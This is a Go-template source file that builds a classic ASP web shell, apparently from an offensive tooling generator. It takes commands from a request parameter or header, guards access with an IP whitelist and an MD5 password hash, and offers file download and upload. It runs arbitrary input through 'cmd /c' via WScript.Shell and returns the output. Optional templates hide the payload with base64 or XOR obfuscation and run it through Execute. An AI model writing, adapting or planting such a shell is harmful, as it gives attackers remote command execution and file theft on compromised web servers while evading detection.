
{{/* Get command from param or header */}}
dim c
{{ if ne .CmdHeader "" }}
c = Request.ServerVariables("HTTP_{{ .CmdHeader }}")
{{ else }}
c = Request("{{ .CmdParam }}")
{{ end }}

{{/* Check if ip is in whitelist */}}
{{ if .Whitelist }}
dim ip
ip = Request.ServerVariables("REMOTE_ADDR")

w = Array({{ .Whitelist }})
for each i in w
  if i <> ip Then
    response.end
  end if
next
{{ end }}

{{/* Check password */}}
{{ if ne .Password "" }}
dim hash, pass
h = "{{ .PasswordHash }}"

{{ if ne .PasswordHeader "" }}
pass = Request.ServerVariables("HTTP_{{ .PasswordHeader }}")
{{ else if ne .PasswordParam "" }}
pass = request("{{ .PasswordParam }}")
{{ end }}
{{/* Hash and compare */}}
Dim asc, enc, bytes, instr, outstr, pos

instr = pass
Set asc = CreateObject("System.Text.UTF8Encoding")
Set enc = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
bytes = asc.GetBytes_4(instr)
bytes = enc.ComputeHash_2((bytes))
outstr = ""
For pos = 1 To LenB(bytes)
  outstr = outstr & LCase(Right("0" & Hex(AscB(MidB(bytes, pos, 1))), 2))
Next

if outstr <> h Then
  response.end
end if
{{ end }}

{{ if .FileCapabilities }}
On Error Resume Next

{{/* Download file */}}
if Left(c, 4) = "get " Then
  dim filePath
  filePath = Split(c, " ")(1)

  Dim fs
  Dim objFile
  Dim objStream

  Set fs = Server.CreateObject("Scripting.FileSystemObject")
  If fs.FileExists(filePath) Then
    Set objFile = fs.GetFile(filePath)
    
    Response.Clear 
    Response.AddHeader "Content-Disposition", "attachment; filename=" & objFile.Name
    Response.AddHeader "Content-Length", objFile.Size
    Response.ContentType = "application/octet-stream"
    
    Set objStream = Server.CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.LoadFromFile(filePath)

    {{/* Response.Buffer = False */}}
    Response.BinaryWrite(objStream.Read)
    objStream.Close
    If Err.Number <> 0 Then
      Response.Clear
      Response.Status = 500
      Response.Write Err.Description
    End If
    
    Set objStream = Nothing
    Set objFile = Nothing
  Else 'fs.FileExists(filePath)
    Response.Clear
    Response.Status = 404
    Response.Write("File not found.")
  End If

  Set fs = Nothing
  response.end

{{/* Upload file */}}
elseif Left(c, 4) = "put " Then
  filePath = Split(c, " ")(1)
  If ubound(Split(c, " ")) > 1 Then
    filePath = Split(c, " ")(2)
  else
    set fs=Server.CreateObject("Scripting.FileSystemObject")
    filePath=fs.getfilename(filePath)
  End If
  
  fileEncoded = Request("f")

  With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
      .DataType = "bin.base64"
      .Text = fileEncoded
      fileContents = BytesToStr(.NodeTypedValue, "utf-8")
      response.write fileContents
  End With

  function BytesToStr(ByVal byteArray, ByVal sTextEncoding)
    With CreateObject("ADODB.Stream")
        .Type = 1 ' adTypeBinary
        .Open
        .Write byteArray
        .Position = 0
        .Type = 2 ' adTypeText
        .CharSet = "utf-8"
        BytesToStr = .ReadText
        .Close
    End With
  end function


  {{/* With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
    .DataType = "bin.base64"
    .Text = fileEncoded
    With CreateObject("ADODB.Stream")
      .Type = 1
      .Open
      .Write .NodeTypedValue
      .Position = 0
      .Type = 2 '
      .CharSet = "utf-8"
      BytesToStr = .ReadText
      .Close
    End With
    response.write Base64Decode
  End With */}}


  response.end

end if
{{ end }}

{{/* Run command */}}
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Dim objShell, objCmdExec
Set objShell = CreateObject("WScript.Shell")
Set objCmdExec = objshell.exec("cmd /c " & c)
o = objCmdExec.StdOut.ReadAll
Response.Write(o)



{{- define "b64" }}
Execute(Base64Decode("{{ .EncCode }}"))
Function Base64Decode(ByVal vCode)
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.text = vCode
  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
  Set oNode = Nothing
  Set oXML = Nothing
End Function
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function
{{ end }}



{{ define "xor" -}}
{{ if ne .EncHeader "" -}}
k = Request.ServerVariables("HTTP_{{ .EncHeader }}")
{{ else }}
k = Request("{{ .EncParam }}")
{{ end -}}

e = decode("{{ .EncCode }}")

Execute(DeCrypt(e,k))
{{/* DeCrypt e,k */}}

Function DeCrypt(strEncrypted, key)
Dim strChar, iKeyChar, iStringChar, i
  for i = 1 to Len(strEncrypted)
    if i Mod Len(key) = 0 then
      iKeyChar = asc(Right(key,1))
    Else
      iKeyChar = asc(mid(key,i Mod Len(key),1))
    end if
    iStringChar = asc(mid(strEncrypted,i,1))
    iDeCryptChar =  iStringChar Xor iKeyChar
    strDecrypted =  strDecrypted & Chr(iDeCryptChar)
  next
  DeCrypt = strDecrypted
End Function

Function XORIt(ByVal Text, ByVal key)
    request.write Text
    request.write key
    Dim l
    Dim lonLenKey, lonKeyPos
    lonLenKey = Len(key)
    For l = 1 To Len(Text)
        lonKeyPos = lonKeyPos + 1
        If lonKeyPos > lonLenKey Then lonKeyPos = 1
        Mid(Text, l, 1) = Chr(Mid(Text, l, 1) Xor Mid(key, lonKeyPos, 1))
    Next
    XORIt = Text
End Function

Function Base64Decode(ByVal vCode)
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.text = vCode
  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
  Set oNode = Nothing
  Set oXML = Nothing
End Function
Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Function decode( byVal strIn )
		Dim w1, w2, w3, w4, n, strOut
		For n = 1 To Len( strIn ) Step 4
			w1 = mimedecode( Mid( strIn, n, 1 ) )
			w2 = mimedecode( Mid( strIn, n + 1, 1 ) )
			w3 = mimedecode( Mid( strIn, n + 2, 1 ) )
			w4 = mimedecode( Mid( strIn, n + 3, 1 ) )
			If w2 >= 0 Then _
				strOut = strOut + _
					Chr( ( ( w1 * 4 + Int( w2 / 16 ) ) And 255 ) )
			If w3 >= 0 Then _
				strOut = strOut + _
					Chr( ( ( w2 * 16 + Int( w3 / 4 ) ) And 255 ) )
			If w4 >= 0 Then _
				strOut = strOut + _
					Chr( ( ( w3 * 64 + w4 ) And 255 ) )
		Next
		decode = strOut
	End Function

  Private Function mimedecode( byVal strIn )
    Dim Base64Chars
    Base64Chars =	"ABCDEFGHIJKLMNOPQRSTUVWXYZ" & _
        "abcdefghijklmnopqrstuvwxyz" & _
        "0123456789" & _
        "+/"
		If Len( strIn ) = 0 Then 
			mimedecode = -1 : Exit Function
		Else
			mimedecode = InStr( Base64Chars, strIn ) - 1
		End If
	End Function
{{ end }}
